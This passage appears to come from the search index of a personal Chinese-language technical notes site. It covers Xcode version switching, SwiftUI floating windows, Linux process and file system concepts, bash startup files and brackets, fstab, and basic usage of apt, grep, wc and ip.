使用: 需要先手动登陆Apple ID 注解 需要对应版本的command line 其他方式 手动命令行操作, 参考地址: https://juejin.cn/post/7251792725070217275 查看当前版本指令: # 或者 xcode-select -p gcc --version 切换版本指令: sudo xcode-select --switch <xcode_folder_path> 上述失败, 现在版本是Mac OS14.1, 能下载不能打开, 作罢","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-question-Xcode-multi--version.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-Xcode-multi--version.html"},{"title":"问题总结","text":"App窗口弹出在最上层 这个分两种情况, 一个是普通App, 一个是系统级App 对于普通App的View 单独View的显示需要先讲其转换为NsWindow然后配置显示: import SwiftUI extension TipView{ // MARK: - Interface func showViewOnNewWindowInSpecificTime(during timer: CGFloat) -> NSWindow { let alertWindow = self.setWindow() displayAsAlert(win: alertWindow, Timer: timer) return alertWindow } // MARK: - Attribute private func displayAsAlert(win:NSWindow, Timer:Double) { // 在当前窗口上显示 win.level = .floating win.isMovableByWindowBackground = false win.titleVisibility = .hidden win.titlebarAppearsTransparent = true win.isOpaque = false win.styleMask.remove(.closable) win.styleMask.remove(.fullScreen) win.styleMask.remove(.miniaturizable) win.styleMask.remove(.fullSizeContentView) win.styleMask.remove(.resizable) win.backgroundColor = NSColor.clear win.orderFrontRegardless() DispatchQueue.main.asyncAfter(deadline: .now() + Timer) { win.close() } } private func setWindow() -> NSWindow { NSWindow(contentViewController: NSHostingController(rootView: self)) } } 主要是 win.level = .floating , 设置为浮动窗口 但是若想弹出在其他全屏App上就不行了. 系统级App 这里的 系统级App 指的是设置了 Application is agent (UIElement) 为 YES 的APP, 此配置作用详见 /docs/后端/swift/Xcode的Info配置 设置后默认就是系统级的App, 不需要再像普通App那样设置浮动窗口, 默认可以显示在其他全屏App上 查看固态寿命 也支持电池循环数啥的, 使用 /docs/操作系统/linux/linux指令/smartctl 指令: smartctl -a /dev/disk0","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-question-conclusion-of-issue.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-conclusion-of-issue.html"},{"title":"fork","text":"进程0是系统引导时创建的一个特殊进程， 在其调用fork创建出一个子进程（即pid=1，又称init）后， 进程0就变成了交换进程（有时也被称为空闲进程），而进程1（init）就是其他进程的祖先 linux除了pid=0的进程都是其他进程使用系统调用fork函数创建的 fork() 函数的主要作用是在父进程调用的基础上创建一个其的子进程。 fork() 函数有一个特点就是只调用一次却会返回两次， 一次是父进程返回的值 一个大于0的数 （即他创建的子进程的PID，PID 是操作系统中进程的唯一标识 ） 而另外一次则是子进程返回的值 为0。 还有一种情况就是父进程调用该函数的时候如果返回的 <0 的数则说明创建进程失败（失败的原因有很多）。 另外一个值得注意的是调用 fork() 函数 的时候 子进程是接着该调用后的代码继续执行的， 如果其后还存在调用fork() 函数 子进程也可以作为父进程创建它的子进程。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Built--in-function-fork.html","loc":"/yq-doc-source-docs-operating-system-linux-Built--in-function-fork.html"},{"title":"文件系统详解","text":"文件系统的基本组成 文件系统就是操作系统中负责管理持久数据的子系统（持久化的将文件保存在硬盘上） 文件系统的基本数据单位是文件，目的是对磁盘上的文件进行管理 Linux，一切皆文件 Linux数据系统会为每个文件分配两个数据结构： 索引节点 (index node)和 目录项 (directory entry)，记录文件元信息和目录层次结构 索引节点 记录文件的元信息，如访问权限、大小、数据在磁盘的位置等等，储存在硬盘中 目录项 记录文件的名字、索引节点指针以及与其他目录项的层级关联关系。 多个目录项关联起来，形成目录结构，与索引节点不同的是，目录项是由内核维护的一个数据结构，不存放于磁盘而是存在于内存 虚拟文件系统 文件系统的种类繁多，而操作系统希望对用户提供一个统一的接口，于是在用户层和文件系统层中引入了中间层，被称为虚拟文件系统 文件存储方式 连续空间存放： 连续的物理空间存储，易产生磁盘碎片 非连续空间存放 链表方式 隐式链表 实现的方式是文件头要包含磁盘块\"第一块\"和\"最后一块\"的位置， 并且每个数据块留出一个指针空间，用来存放下一个数据块的位置。 稳定性较差，一般发生错误导致指针损坏，会导致文件数据的丢失 显式链接 相当于在隐式的基础上取出所有的指针，放在内存的一个表上。 链接文件各个数据块的指针，显式的存放在内存的一张表中，每个表项中存放链接指针， 指向下一个数据块号。（表在内存，不适用与大磁盘） 链表的方式解决了连续分配的磁盘碎片和文件动态拓展问题，但是不能有效支持直接访问（FAT除外） 索引方式 索引解决了直接访问的问题。索引的现实是为每个文件创建一个索引数据块，里面存放的是指向文件数据块的指针列表。 索引的缺陷在于储存索引带来的额外开销 链式索引块 链表加索引的组合，实现方式是在索引数据块留出一个存放下一个索引数据块的指针。会出现某个索引数据块坏了导致文件受损。 多级索引块 通过一个索引块来存储多个索引数据块（俄罗斯套娃）。 早期 Unix存储 结合了以上的优点: 一个索引文件头（Inode）——————>10个数据块 ——————>一级索引数据块——————>n个数据块 ——————>二级索引数据块——————>n&#94;2个数据块 ——————>三级索引数据块——————>n&#94;3个数据块 如果存放文件的数据块超过10块，采用直接查找的方式 超过10块，采用一级间接索引； 以上不够存放大文件，采用二级索引； 以上不够存放大文件，采用三级索引。 文件头包含13个指针，10个指向数据块，各1个一、二、三级索引的指针指向。 此方案用在了Linux Ext2/3文件系统里，解决了大文件的存储，但是对于大文件的访问需要大量的查询，访问效率低。 空闲空间管理 空闲表法 为所有的空闲空间建立一张表，包含空闲区的第一个块号和该空闲区的个数（连续分配） 空闲链表法 所有的空闲块以链表的方式来指向，特点是简单 缺点：指针会消耗一定存储空间，不能随机访问，效率低 空闲表和空闲链表都不适合大文件系统，否则会使表太大 位图法 利用二进制的一位来表示磁盘中一个盘块的使用情况 （Linux就采用此法管理空闲空间，还用来进行Inode空闲块的管理，因为Inode也是存在磁盘的） 文件系统的结构 数据库的位图是放在磁盘块里的，假设是放在一个块里，一个块4 k， 每位表示一个数据块，共可以表示4 * 1024 * 8 = 2&#94;15个空闲块， 由于一个数据块是4 k大小，那么最大可以表示 2&#94;15 * 4 * 1024 = 2&#94;27 个byte，也就是128 M。 也就是说按照上面的结构，采用 [一个块的位图 + 一系列的块] ， 外加 [一个iNode的位图 + 一系列iNode的结构] 所表示的内容最大128 M太少了。 上述结构在Linux中被称为一个**块组**， 那么有n多的块组，就能表示n大的文件 Linux Ext2 整个文件系统由1 k的引导块加n个块组组成，块组包含 超级块1块 块组描述符多块 数据位图一块 iNode位图一块 iNode列表多块 数据块多块 其中， 超级块 与 块组描述符 是全局信息，非常重要 Ext2的后续系统中采用了稀疏技术（并不是每一块都有 超级块 与 块组描述符 ）。 目录的存储 目录文件的块里保存着目录里面一项项文件信息。 Linux的Ext文件系统就是采用了哈希表，来保存目录的内容。 目录查询通过在磁盘反复搜索所完成，i/o开销比较大，所以可以先缓存在内存里面。 软链接和硬链接 硬链接 多个目录项的索引节点指向一个文件系统，而 iNode 是不可跨文件系统的， 每个文件系统都有自己的iNode数据结构和列表，所以硬链接是不可跨文件系统的。 只有删除文件的所有硬链接以及源文件时，系统才会彻底删除该文件。 软链接 相当于重新创建一个文件，这个文件有独立的inode，但是文件内容是另外一个文件的路径， 所以访问软链接的时候，实际相当于访问到另一个文件，所以软链接是可跨越文件系统的。 总结一下： 硬链接： 与普通文件没什么不同， inode 都指向同一个文件在硬盘中的区块 软链接： 保存了其代表的文件的绝对路径，是另外一种文件，在硬盘上有独立的区块，访问时替换自身路径。 文件i/o 分类： 缓冲与非缓冲i/o 是否通过标准库的缓存访问文件（缓冲：标准库内部的缓冲）。 直接与非直接i/o 是否利用操作系统的缓存，内核空间缓存，也叫页缓存 直接i/o：不会发生内核缓存和用户数据之间的复制，而是直接经过文件系统访问磁盘。 非直接i/o：读操作时，数据从内核缓存拷贝给用户程序，写操作时，数据从用户程序拷贝给内核缓存，再由内核决定什么时候写到磁盘 阻塞与非阻塞i/o VS 同步与异步i/o 阻塞等待的是\"内核数据准备好\"和\"数据从内核态拷贝到用户态\"这两个过程。 非阻塞，read在为准备好时立即返回，后又轮询。以为太傻了，改进了有了多路复用（都是同步的）。 异步不需等待，可以直接去做其他的，系统会自己完成调用写到程序空间","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-File-system-detailed-explanation.html"},{"title":"linux系统环境加载顺序","text":"登陆shell(login shell) 取得 bash 时需要完整的登陆流程的，就称为 login shell. 比如通过ssh方式连接，或者由tty1 ~ tty6 登陆， 需要输入用户的账号与密码，此时取得的 bash 就称为login shell 当我们在终端上运行 bash 、 zsh 等命令登录系统时,启动的shell就是登录shell。 它的环境变量加载顺序是: /etc/profile 此文件为系统的每个用户设置环境信息，当用户第一次登录时，该文件被执行。 并从/etc/profile.d目录的配置文件中搜集shell的设置。 /etc/bashrc 为每一个运行bash shell的用户执行此文件。当bash shell被打开时，该文件被读取。 ~/.bash_profile 每个用户都可使用该文件输入专用于自己使用的shell信息，当用户登录时，该文件仅仅执行一次！默认情况下，他设置一些环境变量，执行用户的。bashrc文件。 ~/.bash_login ~/.profile ~/.bashrc 该文件包含专用于你的bash shell的bash信息，当登录时以及每次打开新的shell时，该该文件被读取。 ~/.bash_logout 当每次退出系统（退出bash shell）时，执行该文件。 另外，/etc/profile中设定的变量（全局）的可以作用于任何用户，而~/.bashrc等中设定的变量（局部）只 能继承/etc/profile中的变量，他们是\"父子\"关系。 ~/.bash_profile 是交互式、login 方式进入 bash 运行的 ~/.bashrc 是交互式 non-login 方式进入 bash 运行的通常二者设置大致相同，所以通常前者会调用后者。 非登陆shell(non-login shell) 取得 bash 接口的方法不需要重复登陆的举动. 比如你以 X window 登陆 Linux 后， 再以 X 的图形化接口启动终端机， 此时该终端接口无需输入账号与密码，则为non-login shell; 又比如你在原本的 bash 环境下再次下达 bash 这个命令， 同样的也没有输入账号密码， 那第二个 bash (子程序) 也是 non-login shell. 当我们在终端上运行 bash -c 'command' 或在GUI程序中启动shell时,启动的shell就是非登录shell。 它的环境变量加载顺序是: /etc/bash.bashrc ~/.bashrc 注解 可以通过 echo $0 查看属于那种Shell 演示 演示环境: [root@system1 ~]# more /etc/redhat-release Red Hat Enterprise Linux Server release 7.0 (Maipo) 当前从ssh登陆到服务器: [root@system1 ~]# tty /dev/pts/1 输入 echo $0， 显示结果为 -bash ，即为登陆shell: [root@system1 ~]# echo $0 -bash [root@system1 ~]# ps PID TTY TIME CMD 77122 pts/1 00:00:00 bash 77157 pts/1 00:00:00 ps 下面在X windows打开一个终端，如下，显示为/bin/bash，即非登陆shell: [root@system1 Desktop]# echo $0 /bin/bash [root@system1 ~]# ps -ef|grep pts|grep bash root 73245 73241 0 11:49 pts/0 00:00:00 /bin/bash root 76511 73245 0 16:19 pts/0 00:00:00 bash root 77122 77118 0 17:02 pts/1 00:00:00 -bash root 77158 77118 0 17:03 pts/2 00:00:00 -bash root 77210 73241 0 17:04 pts/3 00:00:00 /bin/bash root 77283 77279 0 17:06 pts/4 00:00:00 -bash root 77332 77122 0 17:06 pts/1 00:00:00 grep --color=auto bash 在上传的结果中73245，77210为非登陆shell，77122，77158，77283为登陆shell 交互式shell(interactive shell) 交互式模式就是在终端上执行，shell等待你的输入，并且立即执行你提交的命令。 这种模式被称作交互式是因为shell与用户进行交互。 这种模式也是大多数用户非常熟悉的：登录、执行一些命令、退出。当你退出后，shell也终止了。 无论是登录shell还是非登录shell,只要它 attach 到当前终端并接受用户的输入, 那它就是一个交互式shell。 交互式shell的环境变量加载顺序包括: 登录shell或非登录shell加载的所有文件 ~/.inputrc 非交互式shell(non-interactive shell) shell也可以运行在另外一种模式：非交互式模式，以shell script(非交互)方式执行。 在这种模式 下，shell不与你进行交互，而是读取存放在文件中的命令,并且执行它们。 当它读到文件的结尾EOF，shell也就终止了。 如果一个shell在后台执行,不接受任何用户输入,那么它就是非交互式shell。非交互式shell仅加载: 登录shell加载的文件(/etc/profile和~/.bash_profile) 非登录shell加载的文件(/etc/bash.bashrc) 如下，执行 echo $-，查看其中的\"i\"选项（表示interactive shell）: [root@system1 ~]# echo $- himBH 如下，为非交互shell: [root@system1 ~]# echo 'echo $-' | bash hB 环境变量的调用顺序 对于登陆shell，读取~/.bash_profile配置文件时，会做出读取顺序判读，如下: ~/.bash_profile —> ~/.bash_login —> ~/.profile 但 bash 的 login shell 配置只会读取上面三个文件的其中一个， 而读取的顺序则是依照上面的顺序。 也就是说，如果 ~/.bash_profile 存在，那么其他两个文件不论有无存在，都不会被读取。 如果 ~/.bash_profile 不存在才会去读取 ~/.bash_login，而前两者都不存在才会读取 ~/.profile 的意思。 在shell登出时会读取 ~/.bash_logout 属于非登录shell：不需要输入密码的登录及远程 SSH 连接——> ~/.bashrc（用户文件U2）——>/etc/bashrc（全局文件G2） 如果用户的Shell 不是登录时启动的（比如手动敲下 bash 时启动或者其他不需要输入密码的登录及远程 SSH 连接情况） 那么这种非登录 Shell 只会加载 ~/.bashrc`（用户环境变量文件），并会去找 `/etc/bashrc`（全局环境变量文件）， 因此如果希望在非登录 Shell 下也可读到设置的环境变量等内容， 就需要将变量设定写入 `~/.bashrc 或者 /etc/bashrc ，而不是 ~/.bash_profile 或 /etc/profile 环境变量相关文件 /etc/profile：系统配置文件，用户登录时读取一次 /etc/profile.d: 系统配置文件夹, 一般下面的 .sh 文件会在/etc/profile加载之后进行加载 /etc/bash.bashrc：（Ubuntu）系统配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次。 /etc/bashrc： （Centos）系统配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次。 ~/.profile（~/.bash_profile、~/.bash_login）：用户配置文件，用户登录时读取一次 ~/.bashrc：用户配置文件，用户登录时读取一次，每次打开一个新终端会话时读取一次 对于 ~/.bash_profile、~/.bash_login、~/.profile，如果终端绑定的是 bash， 则按照顺序进行读取（如果存在，就不继续读取） 系统配置文件作用于全局，而用户配置文件仅针对当前登录的用户 先读取系统配置文件，再读取用户配置文件，用户配置文件的变量和表达式等都继承自系统配置文件","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Linux-system-environment-loading-order.html"},{"title":"特殊符号","text":"code: & 表示任务在后台执行，如要在后台运行 && 表示前一条命令执行成功时，才执行后一条命令 | 表示管道，上一条命令的输出，作为下一条命令参数(输入) || 表示上一条命令执行失败后，才执行下一条命令 > 符号是指：将正常信息重定向","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-symbol.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-symbol.html"},{"title":"fstab","text":"概述 /etc/fstab是用来存放文件系统的静态信息的文件。 系统启动的时候，系统会自动从这个文件读取信息，并且会自动的将文件中指定的文件系统挂载到指定的目录。 查看: less /etc/fstab 字段定义: <file system> <dir> <type> <options> <dump> <pass> <file system>：要挂载的分区或者存储设备 <dir>：挂载的位置（路径） <type>：挂载设备或者分区的文件系统类型， 如：ext2,ext3,ext4,ntfs,swap,auto等 <options>：挂载时使用的参数，注意有些mount参数是特定文件系统才有的 <dump>：dump工具通过它决定何时备份。 允许写入数字0,1 0表示忽略；1，表示被封 <pass>：决定fsck需要检查文件系统的检查顺序 允许写入0,1,2 根目录应当获取最高的优先权1，其他所有需要被检查的设备设置为2，0表示设备不会fsck被检查 文件系统标识 三种方法： 内核名称 uuid label 其中使用uuid与label好处在于与磁盘顺序无关","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-fstab.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-fstab.html"},{"title":"bash括号","text":"单小括号() 命令组。 括号中的命令将会新开一个子shell顺序执行，所以括号中的变量不能够被脚本余下的部分使用。 括号中多个命令之间用分号隔开，最后一个命令可以没有分号，各命令和括 号之间不必有空格。 命令替换。 等同于 cmd ，shell扫描一遍命令行，发现了 $(cmd) 结构，便将$(cmd)中的cmd执行一次， 得到其标准输出，再将此输出放到原来命令。有些shell不支持，如tcsh。 初始化数组。 如: array=(a b c d) 双小括号(()) 整数扩展。 这种扩展计算是整数型的计算，不支持浮点型。 ((exp))结构扩展并计算一个算术表达式的值，如果表达式的结果为0， 那么返回的退出状态码为1，或者是\"假\"， 而一个非零值的表达式所返回的退出状态码将为0，或者是\"true\"。 若是逻辑判断，表达式exp为真则为1,假则为0。 只要括号中的运算符、表达式符合C语言运算规则，都可用在$((exp))中，甚至是三目运算符。 作不同进位(如二进制、八进制、十六进制)运算时，输出结果全都自动转化成了十进制。 如: echo $((16#5f)) 结果为95 (16进位转十进制) 单纯用 (( )) 也可重定义变量值，比如 a=5; ((a++)) 可将 $a 重定义为6。 常用于算术运算比较，双括号中的变量可以不使用$符号前缀。 括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则, 比如可以直接使用: for((i=0;i<5;i++)) 如果不使用双括号, 则为: for i in `seq 0 4` 或者: for i in {0..4} 再如可以直接使用: if (($i<5)) 如果不使用双括号, 则为: if [ $i -lt 5 ] [] 主要用于字符串比较和整数比较 bash 的内部命令，[和test是等同的。 如果我们不用绝对路径指明，通常我们用的都是bash自带的命令。 if/test结构中的左中括号是调用test的命令标识，右中括号是关闭条件判断的。 这个命令把它的参数作为比较表达式或者作为文件测试， 并且根据比较的结果来返回一个退出状态码。 if/test结构中并不是必须右中括号，但是新版的Bash中要求必须这样。 test和[]中可用的比较运算符只有==和!=，两者都是用于字符串比较的， 不可用于整数比较，整数比较只能使用-eq，-gt这种形式。 无论是字符串比较还是整数比较都不支持大于号小于号。 如果实在想用，对于字符串比较可以使用转义形式， 如果比较\"ab\"和\"bc\"：[ ab < bc ]，结果为真，也就是返回状态为0。 [ ]中的逻辑与和逻辑或使用-a 和-o 表示。 字符串比较时可用 == 和 != ，而整数比较时要使用: -eq #等于 equal -ne #不等于 not equal 有些说是 inequality -gt #大于 greater than -lt #小于 less than -ge #大于等于 greater than or equal -le #小于等于 less than or equal 字符范围。用作正则表达式的一部分，描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。 在一个array 结构的上下文中，中括号用来引用数组中每个元素的编号。 双中括号[[]] [[是 bash 程序语言的关键字。 并不是一个命令，[[ ]] 结构比[ ]结构更加通用。 在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割，但是会发生参数扩展和命令替换。 支持字符串的模式匹配，使用=~操作符时甚至支持shell的正则表达式。 字符串比较时可以把右边的作为一个模式，而不仅仅是一个字符串， 比如[[ hello == hell? ]]，结果为真。[[ ]] 中匹配字符串或通配符，不需要引号。 使用[[ ... ]]条件判断结构，而不是[ ... ]，能够防止脚本中的许多逻辑错误。 比如，&&、||、<和> 操作符能够正常存在于[[ ]]条件判断结构中， 但是如果出现在[ ]结构中的话，会报错。 比如可以直接使用: if [[ $a != 1 && $a != 2 ]] 如果不适用双括号, 则为: if [ $a -ne 1] && [ $a != 2 ] # 或者 if [ $a -ne 1 -a $a != 2 ] bash把双中括号中的表达式看作一个单独的元素，并返回一个退出状态码。 符号$后的括号 （1）${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。 （2）$(cmd) 命令替换，和 cmd 效果相同，结果为shell命令cmd的输，过某些Shell版本不支持$()形式的命令替换, 如tcsh。 （3）$((expression)) 和 exprexpression 效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。 多条命令执行 （1）单小括号，(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后可以没有分号。 （2）单大括号，{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。 对{}和()而言, 括号中的重定向符只影响该条命令， 而括号外的重定向符影响到括号中的所有命令。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-bracket.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-shell-bracket.html"},{"title":"apt","text":"debian/ubuntu 的下的包管理器 语法: apt <command> [options] [packages] 支持的command show list install search depends 查看某个软件包的依赖信息 选项参数 -y 无需输入y手动确认是否安装 install install 命令用来安装或者升级包。 每个包都有一个包名，而不是一个完全限定的文件名(例如，在 Debian 系统中，提供的参数是 apt-utils，而不是 apt-utils_1.6.1_amd64.deb)。 被安装的包依赖的包也将被安装。配置文件 /etc/apt/sources.list 中包含了用于获取包的源(服务器)。install 命令还可以用来更新指定的包。 upgrade upgrade 命令用于从 /etc/apt/sources.list 中列出的源安装系统上当前安装的所有包的最新版本。 在任何情况下，当前安装的软件包都不会被删除，尚未安装的软件包也不会被检索和安装。 如果当前安装的包的新版本不能在不更改另一个包的安装状态的情况下升级，则将保留当前版本。 必须提前执行 update 命令以便 apt-get 知道已安装的包是否有新版本可用。 注意 update 与 upgrade 的区别： update 是更新软件列表，upgrade 是更新软件。 dist-upgrade 除执行升级功能外，dist-upgrade 还智能地处理与新版本包的依赖关系的变化。 apt-get 有一个 \"智能\" 的冲突解决系统，如果有必要，它将尝试升级最重要的包，以牺牲不那么重要的包为代价。 因此，distr -upgrade 命令可能会删除一些包。 因此在更新系统中的包时，建议按顺序执行下面的命令: $ apt-get update $ apt-get upgrade -y $ apt-get dis-upgrade -y remove remove 与 install 类似，不同之处是删除包而不是安装包。注意，使用 remove 命令删除一个包会将其配置文件留在系统上。 purge purge 命令与 remove 命令类似，purge 命令在删除包的同时也删除了包的配置文件。 autoremove autoremove 命令用于删除自动安装的软件包，这些软件包当初是为了满足其他软件包对它的依赖关系而安装的，而现在已经不再需要了。 download download 命令把指定包的二进制文件下载到当前目录中。注意，是类似 *.deb 这样的包文件。 clean clean 命令清除在本地库中检索到的包。它从 /var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/ 目录删除除锁文件之外的所有内容。 autoclean 与 clean 命令类似，autoclean 命令清除检索到的包文件的本地存储库。 不同之处在于，它只删除不能再下载的软件包文件，而且这些文件在很大程度上是无用的。 这允许长时间维护缓存，而不至于大小失控。 source source 命令下载包的源代码。默认会下载最新可用版本的源代码到当前目录中。 changelog changelog 命令尝试下载并显示包的更新日志。 相关 apt-cache /docs/操作系统/linux/linux指令/apt-cache apt-get /docs/操作系统/linux/linux指令/apt-get","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT.html"},{"title":"cd","text":"目录的切换 返回最近一次的目录: cd -","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chengdu.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chengdu.html"},{"title":"eval","text":"重新运算求出参数的内容","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Eval.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Eval.html"},{"title":"wc","text":"利用wc指令我们可以计算文件的Byte数、字数、或是列数，若不指定文件名称、或是所给予的文件名为\"-\"，则wc指令会从标准输入设备读取数据。 语法: wc [-clw][--help][--version][文件...] 参数 -c , --bytes , --chars 只显示Bytes数。 -l , --lines 显示行数。 -w , --words 只显示字数。一个字被定义为由空白、跳格或换行字符分隔的字符串 -m 统计字符数。这个标志不能与 -c 标志一起使用。 -L 打印最长行的长度。 --help 在线帮助。 --version 显示版本信息。 注解 默认情况下, 显示 行数、单词数，以及字节数. 支持多个文件统计总数. 用例 计算当前文件夹下视频数(mp4文件个数): ls *.mp4 | wc -l","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Finish.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Finish.html"},{"title":"grep","text":"用于查找文件里符合条件的字符串。 grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。 若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。 语法: grep [-abcEFGhHilLnqrsvVwxy][-A<显示行数>][-B<显示列数>][-C<显示列数>][-d<进行动作>][-e<范本样式>][-f<范本文件>][--help][范本样式][文件或目录...] 选项参数(常用) -E 在扩展正则模式下 -P 在Perl正则模式下 -V 将不匹配的过滤出来 -r 递归查找 -r , -R 递归查找 -q 安静模式，不在屏幕上输出 -i 忽略大小写 -n 增加行号 -o 只输出文件中匹配到的部分 -m <num> , --max-count= <num> 找到num行结果后停止查找，用来限制匹配行数 --color 红色输出 全部可参考: Linux grep 命令 获取文件内容所在行: cat file | grep -n 'xxx' | cut -d ':' -f 1 # 或者 grep -n 'xxx' file | cut -d ':' -f 1 搜索data文件夹下的所有文件, 是否包含pack: grep -r \"pack\" data 全部选项 -a , --text 不要忽略二进制的数据。 -A <显示行数> , --after-context= <显示行数> 除了显示符合范本样式的那一列之外，并显示该行之后的内容。 -b , --byte-offset 在显示符合样式的那一行之前，标示出该行第一个字符的编号。 -B <显示行数> , --before-context= <显示行数> 除了显示符合样式的那一行之外，并显示该行之前的内容。 -c , --count 计算符合样式的列数。 -C <显示行数> , --context= <显示行数> 或者直接 -<显示行数> . 除了显示符合样式的那一行之外，并显示该行之前后的内容。 -d <动作> , --directories= <动作> 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作。 -e <范本样式> , --regexp= <范本样式> 指定字符串做为查找文件内容的样式。 -E , --extended-regexp 将样式为延伸的正则表达式来使用。 -f <规则文件> , --file= <规则文件> 指定规则文件，其内容含有一个或多个规则样式，让grep查找符合规则条件的文件内容，格式为每行一个规则样式。 -F , --fixed-regexp 将样式视为固定字符串的列表。 -G , --basic-regexp 将样式视为普通的表示法来使用。 -h , --no-filename 在显示符合样式的那一行之前，不标示该行所属的文件名称。 -H , --with-filename 在显示符合样式的那一行之前，表示该行所属的文件名称。 -i , --ignore-case 忽略字符大小写的差别。 -l , --file-with-matches 列出文件内容符合指定的样式的文件名称。 -L , --files-without-match 列出文件内容不符合指定的样式的文件名称。 -n , --line-number 在显示符合样式的那一行之前，标示出该行的列数编号。 -o , --only-matching 只显示匹配PATTERN 部分。 -q , --quiet , --silent 不显示任何信息。 -r , --recursive 此参数的效果和指定\"-d recurse\"参数相同。 -s , --no-messages 不显示错误信息。 -v , --invert-match 显示不包含匹配文本的所有行。 -V , --version 显示版本信息。 -w , --word-regexp 只显示全字符合的列。 -x , --line-regexp 只显示全列符合的列。 -y 此参数的效果和指定\"-i\"参数相同。 grep去除本身 有个小技巧, 与ps结合的时候, grep的结果往往会包含grep当前查询本身, 那么如何去掉? 死办法: ps | grep test | grep -v grep 优雅点: ps | grep \"tes[t]\" 稍微解释一下, [t] 表示一个正则, 只能选择字符 z, 与直接查询效果是一致的, 能排出掉grep本身, 是因为这时候grep进程大致长这: ps | grep \"tes[t]\" 不会解析正则, 所以可以直接排除掉","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GREP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GREP.html"},{"title":"history","text":"命令历史","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-History.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-History.html"},{"title":"ip","text":"若无则安装: apt install iproute2 查看网络状态 语法: ip [option] [动作] [指令] 选项与参数 支出的选项/命令: -s : s link : link address, a : address route, r : route s 说明: ip -s # 显示该装置的统计数据 # 后面可跟参数 link # 关于设备的相关设定，包括MTU Mac地址等 addr/address # 关于额外的ip协议。例如多ip的达成 route # 与路由相关的设定 link 说明: ip link # 后面可跟参数 show # 仅显示出与这个装置相关的内容 set # 可以开始设定项目，device指的是eth0等界面代号 # set支持参数 up|down # 启动或者关闭某个接口 address # 如果这个装置可以修改mac地址，用这个修改 name # 命名 mtu # 最大传输单元 address 查看网卡信息 说明: # 或者 ip a ip address # 后面可跟参数 show # 显示接口ip信息. 默认就是此参数 add|del # 添加/删除相关设定 # 支持参数 ip # 主要就是网域的设定 dev # 这个ip参数设定的接口 如eth0， # 包含的参数如下 broadcast # 设定广播地址，如果设定值是+，表示自动设置 label # 装置的别名 例如 eth0:0 scope # 这个界面的领域， # 有以下几类 global # 允许来自所有来源的联机 site # 仅支持ipv6 仅允许本主机的联机 link # 仅允许本装置自我联机 host # 仅允许主机内部联机 输出参数详解： lo 全称loopback，是回环地址，经常被分配到127.0.0.1地址上，用于本机通信，经过内核处理后直接返回，不会在任何网络中出现。 eth0 网卡名，如果有多块网卡，会有多个eth 或其它名称。 link/ether 这个是MAC地址，唯一的，一块网卡一个MAC。 inet 网卡上绑定的IP地址，通常所说的IPV4，一块网卡可以绑定多个IP地址。在绑定IP地址时注意：windows主机会提示IP地址冲突，而linux主机无任何提示，在添加新的IP地址时务必检测一下新地址是否和原有地址冲突，避免造成访问不可用。常用检测命令：ping或arping IP； inet6 IPV6地址，暂时没有，预留。 网络设备状态标识: <BROADCAST,MULTICAST,UP,LOWER_UP> UP 网卡处于启动状态。 BROADCAST 网卡有广播地址，可以发生广播包。 MULTICAST 网卡可以发生多播包。 LOWER_UP L1是启动的，即网线是插着的。 <BROADCAST,MULTICAST,UP,LOWER_UP> 这个配置串告诉我们： BROADCAST 该接口支持广播 MULTICAST 该接口支持多播 UP 网络接口已启用 LOWER_UP 网络电缆已插入，设备已连接至网络 列出的其他值也告诉了我们很多关于接口的知识， 但我们需要知道 brd 和 qlen 这些词代表什么意思。 所以，这里显示的是上面展示的 ip 信息的其余部分的翻译: mtu 1500 最大传输单位（数据包大小）为1,500字节 qdisc pfifo_fast 用于数据包排队 state UP 网络接口已启用 group default 接口组 qlen 1000 传输队列长度 link/ether 